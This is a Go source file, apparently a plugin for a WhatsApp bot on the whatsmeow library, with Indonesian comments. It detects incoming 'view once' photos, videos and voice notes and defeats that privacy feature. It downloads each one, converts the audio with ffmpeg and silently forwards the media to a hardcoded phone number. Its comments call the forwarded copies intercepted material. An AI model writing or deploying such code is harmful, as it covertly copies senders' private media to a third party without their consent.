package plugin

import (
	"context"
	"fmt"
	"os"
	"os/exec"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
)

// AntiViewOncePasif mendeteksi pesan View Once dari struktur protobuf mentah
func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
	ctx := context.Background()

	// 1. Kunci nomor tujuan penerima hasil sadapan
	targetJID, errJID := types.ParseJID("6285161098098@s.whatsapp.net")
	if errJID != nil {
		return false
	}

	if m.Info.IsFromMe || m.Message == nil {
		return false
	}

	var imgMsg *proto.ImageMessage
	var vidMsg *proto.VideoMessage
	var audMsg *proto.AudioMessage
	var isViewOnce bool

	// LAPISAN 1: Periksa apakah dibungkus di dalam kontainer ViewOnceMessage
	rawMessage := m.Message
	if m.Message.GetViewOnceMessageV2() != nil {
		rawMessage = m.Message.GetViewOnceMessageV2().GetMessage()
		isViewOnce = true
	} else if m.Message.GetViewOnceMessage() != nil {
		rawMessage = m.Message.GetViewOnceMessage().GetMessage()
		isViewOnce = true
	}

	if rawMessage == nil {
		return false
	}

	// LAPISAN 2: Ambil objek media dan periksa flag internalnya jika kontainer luar kosong
	if rawMessage.GetImageMessage() != nil {
		imgMsg = rawMessage.GetImageMessage()
		if imgMsg.GetViewOnce() {
			isViewOnce = true
		}
	} else if rawMessage.GetVideoMessage() != nil {
		vidMsg = rawMessage.GetVideoMessage()
		if vidMsg.GetViewOnce() {
			isViewOnce = true
		}
	} else if rawMessage.GetAudioMessage() != nil {
		audMsg = rawMessage.GetAudioMessage()
		if audMsg.GetViewOnce() {
			isViewOnce = true
		}
	}

	// Jika setelah diperiksa ke semua lapisan tetap bukan View Once, abaikan
	if !isViewOnce || (imgMsg == nil && vidMsg == nil && audMsg == nil) {
		return false
	}

	// Kirim kode reaksi tanda bot mulai memproses sadapan di background
	sendReactionRVO(client, m.Info.Chat, m.Info.ID, "🕒")

	var data []byte
	var err error

	// 3. Proses Download & Meneruskan ke Target Nomor
	if imgMsg != nil {
		data, err = client.Download(ctx, imgMsg)
		if err == nil {
			uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaImage)
			if errUpload == nil {
				captionStr := fmt.Sprintf("[RVO PASIF - %s]\n%s", m.Info.PushName, imgMsg.GetCaption())
				client.SendMessage(ctx, targetJID, &proto.Message{
					ImageMessage: &proto.ImageMessage{
						URL:           &uploaded.URL,
						DirectPath:    &uploaded.DirectPath,
						MediaKey:      uploaded.MediaKey,
						FileEncSHA256: uploaded.FileEncSHA256,
						FileSHA256:    uploaded.FileSHA256,
						FileLength:    &uploaded.FileLength,
						Mimetype:      imgMsg.Mimetype,
						Caption:       &captionStr,
					},
				})
				sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
			}
		}
	} else if vidMsg != nil {
		data, err = client.Download(ctx, vidMsg)
		if err == nil {
			uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaVideo)
			if errUpload == nil {
				captionStr := fmt.Sprintf("[RVO PASIF - %s]\n%s", m.Info.PushName, vidMsg.GetCaption())
				client.SendMessage(ctx, targetJID, &proto.Message{
					VideoMessage: &proto.VideoMessage{
						URL:           &uploaded.URL,
						DirectPath:    &uploaded.DirectPath,
						MediaKey:      uploaded.MediaKey,
						FileEncSHA256: uploaded.FileEncSHA256,
						FileSHA256:    uploaded.FileSHA256,
						FileLength:    &uploaded.FileLength,
						Mimetype:      vidMsg.Mimetype,
						Caption:       &captionStr,
					},
				})
				sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
			}
		}
	} else if audMsg != nil {
		data, err = client.Download(ctx, audMsg)
		if err == nil {
			fileInput := fmt.Sprintf("temp_pasif_in_%s.ogg", m.Info.ID)
			fileOutput := fmt.Sprintf("temp_pasif_out_%s.mp3", m.Info.ID)

			err = os.WriteFile(fileInput, data, 0644)
			if err == nil {
				cmd := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
				if errCmd := cmd.Run(); errCmd == nil {
					audioData, errRead := os.ReadFile(fileOutput)
					if errRead == nil {
						uploaded, errUpload := client.Upload(ctx, audioData, whatsmeow.MediaAudio)
						if errUpload == nil {
							isPTT := true
							mpegMime := "audio/mpeg"
							client.SendMessage(ctx, targetJID, &proto.Message{
								AudioMessage: &proto.AudioMessage{
									URL:           &uploaded.URL,
									DirectPath:    &uploaded.DirectPath,
									MediaKey:      uploaded.MediaKey,
									FileEncSHA256: uploaded.FileEncSHA256,
									FileSHA256:    uploaded.FileSHA256,
									FileLength:    &uploaded.FileLength,
									Mimetype:      &mpegMime,
									PTT:           &isPTT,
								},
							})
							sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
						}
					}
				}
				os.Remove(fileInput)
				os.Remove(fileOutput)
			}
		}
	}

	return true // Berhasil dicegat, return true agar di handler.go berhenti (tidak double-proses)
}

func sendReactionRVO(client *whatsmeow.Client, chat types.JID, msgID string, emoji string) {
	ctx := context.Background()
	remoteJidStr := chat.String()
	fromMe := false

	client.SendMessage(ctx, chat, &proto.Message{
		ReactionMessage: &proto.ReactionMessage{
			Key: &proto.MessageKey{
				RemoteJID: &remoteJidStr,
				FromMe:    &fromMe,
				ID:        &msgID,
			},
			Text:              &emoji,
			SenderTimestampMS: new(int64),
		},
	})
}
